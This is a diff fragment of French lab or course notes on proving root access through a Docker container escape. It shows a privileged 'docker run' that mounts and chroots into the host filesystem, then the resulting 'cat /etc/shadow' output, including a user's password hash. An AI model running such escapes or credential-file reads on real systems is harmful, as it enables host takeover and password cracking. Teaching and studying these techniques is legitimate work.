@@ -171,3 +171,17 @@ pour prouver que vous êtes root, plein de moyens possibles
   - par exemple un cat /etc/shadow qui contient les hash des mots de passe de la machine hôte
 
 `docker run -it --privileged --net host --ipc=host -v /:/host alpine chroot /host`
+
+```
+root@antnaserv:/# cat /etc/shadow
+root:*:19579:0:99999:7:::
+daemon:*:19579:0:99999:7:::
+bin:*:19579:0:99999:7:::
+sys:*:19579:0:99999:7:::
+...
+fwupd-refresh:*:19579:0:99999:7:::
+usbmux:*:19675:0:99999:7:::
+antna:$6$rLoAV.QR1JtPPWax$qMiioqI8AUgOeZ/MMM7UKtxlJj4TgPyn/NAYN5/W3nGRLf1IVYbGkAn4kfLEVd6ra/icAXxDjiOUsvNnzLddU/:19675:0:99999:7:::
+lxd:!:19675::::::
+sshd:*:19676:0:99999:7:::
+```
